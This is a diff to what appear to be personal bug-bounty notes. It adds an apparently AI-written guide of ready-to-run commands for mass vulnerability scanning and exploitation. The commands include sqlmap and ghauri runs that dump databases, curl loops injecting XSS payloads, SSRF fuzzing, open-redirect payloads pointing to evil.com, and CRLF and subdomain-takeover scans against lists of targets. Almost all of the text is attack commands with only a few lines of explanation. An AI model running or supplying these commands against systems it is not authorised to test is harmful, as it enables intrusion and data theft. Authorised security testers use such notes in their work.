@@ -11,14 +11,9 @@
 
 
 
-
-
-
-
-
 https://github.com/0xKayala/NucleiFuzzer
 
-open:
+---------------------------------------------------------------------------------open:
 getting urls:
 cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
 
@@ -64,3 +59,188 @@ done
 
 
 
+
+
+-------------------crlf--------------------------
+using crlfi:
+crlfi -i domains.txt
+
+using crlfuzz:
+crlfuzz -l domains.txt | tee -a output.txt
+crlfuzz -l urls.txt | tee -a output.txt
+
+
+using crlfsuite:
+crlfsuite -iT domains.txt
+
+
+use nuclei
+nuclei-l domains.txt -tags crlf
+nuclei -l urls.txt -tags cors
+
+
+
+## Automation Guide for Nuclei Scanning
+
+### **1. Scanning Domains and Subdomains**
+
+* **Scan Specific Target:**
+
+  ```bash
+  nuclei -target "https://target.com" -t cves -o out.txt
+  nuclei -target "https://target.com" -t /nuclei-templates/cves -o out.txt
+  ```
+
+* **Scan Specific Tags (e.g., AEM):**
+
+  ```bash
+  nuclei -u <subdomain or url> -tags aem
+  ```
+
+* **Scan Live Subdomains:**
+
+  ```bash
+  nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium
+  ```
+
+* **Scan All Templates on a Single Target:**
+
+  ```bash
+  nuclei -target "https://target.com" -t /nuclei-templates/ -o out.txt
+  ```
+
+* **Mass Hunting:**
+
+  ```bash
+  cat alldomains.txt | nuclei -t /nuclei-templates/ -o out.txt
+  ```
+
+---
+
+### **2. Vulnerability-Specific Automation**
+
+* **General Bugs:**
+
+  ```bash
+  cat crlf.txt | nuclei -t /prsnl/crlf.yaml
+  cat iis.txt | nuclei -t /prsnl/iis.yaml
+  cat git.txt | nuclei -t /prsnl/gitExposed.yaml
+  cat cors.txt | nuclei -t /prsnl/cors.yaml
+  ```
+
+* **Filter Parameters for SQLi, XSS, and Open Redirects:**
+
+  ```bash
+  cat all_urls.txt | grep '?' | tee params.txt
+  cat all_urls.txt | grep '=' | tee params.txt
+  ```
+
+* **Find Hidden Parameters:**
+
+  ```bash
+  cat params.txt | xargs -I % arjun -u "%" -oT hidden_params.txt
+  ```
+
+---
+
+### **SQL Injection (SQLi) Automation**
+
+* **Using SQLMap:**
+
+  ```bash
+  sqlmap -m params.txt --batch --random-agent --level=5 --risk=3 --dbs
+  sqlmap -m urls.sqli --level 5 --risk 3 --batch --dbs --tamper=between
+  ```
+
+* **Using Nuclei for SQLi Detection:**
+
+  ```bash
+  cat params.txt | grep -E '\?[^=]+=.+$' | nuclei -t /prsnl/errsqli.yaml -dast
+  ```
+
+* **For Exploitation:**
+
+  ```bash
+  ghauri -m sqli_urls.txt --batch --dbs --level=3 --threads=10
+  ```
+
+---
+
+### **Cross-Site Scripting (XSS) Automation**
+
+* **Using Curl:**
+
+  ```bash
+  cat urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1<script>alert(1)<\/script>/' | xargs -I {} curl -s -k {}
+  ```
+
+* **Using Dalfox:**
+
+  ```bash
+  dalfox file params.txt --deep --blind xss.yourdomain.com
+  dalfox -b <payload> file urls.xss
+  ```
+
+* **Using Paramspider and Curl:**
+
+  ```bash
+  paramspider -d target.com | qsreplace '"/><script>confirm(1)</script>' > xss.txt
+  while read host; do
+    curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host Vulnerable" || echo "$host Not Vulnerable"
+  done < xss.txt
+  ```
+
+---
+
+### **Server-Side Request Forgery (SSRF) Automation**
+
+* **Using Qsreplace and FFUF:**
+
+  ```bash
+  cat params_url.ssrf | qsreplace <burp-collab> | tee ssrf_urls_ffuf
+  ffuf -c -w ssrf_urls_ffuf -u FUZZ
+  ```
+
+* **Using Nuclei:**
+
+  ```bash
+  cat or.txt | nuclei -t /prsnl/blind-ssrf.yaml --retries 2 --dast
+  cat or.txt | nuclei -t /prsnl/response-ssrf.yaml --retries 2 --dast
+  ```
+
+---
+
+### **Open Redirect (OD) Automation**
+
+* **Using Curl:**
+
+  ```bash
+  cat params_urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1https:\/\/evil.com/' | xargs -I {} curl -s -k {}
+  ```
+
+* **Using Nuclei:**
+
+  ```bash
+  cat or.txt | qsreplace "https://evil.com" | anew open_redirects_payloads.txt
+  cat open_redirects_payloads.txt | nuclei -t /prsnl/openredirect.yaml --retries 2 -rl 10 -bs 2 -c 2 -as -silent -o result.txt -json result.json -s critical,high
+  ```
+
+  * `qsreplace` is used to replace query parameter values with `https://evil.com` to test for open redirects.
+  * `anew` ensures no duplicates are present in `open_redirects_payloads.txt`.
+  * Nuclei will use `openredirect.yaml` to check for open redirect vulnerabilities.
+
+---
+
+This improved guide will help you manage and automate your scans more efficiently. Let me know if you'd like additional tweaks!
+
+
+cors:
+nuclei -l domains.txt -tags cors
+
+subdomain takeover:
+using nuclei:
+nuclei -l domains.txt -t /http/takeovers/ -o out.txt
+nuclei -l hosts.txt -t subdomain-takeover-detect-all-takeovers.yaml
+
+using subzy:
+subzy run -targets domains.txt
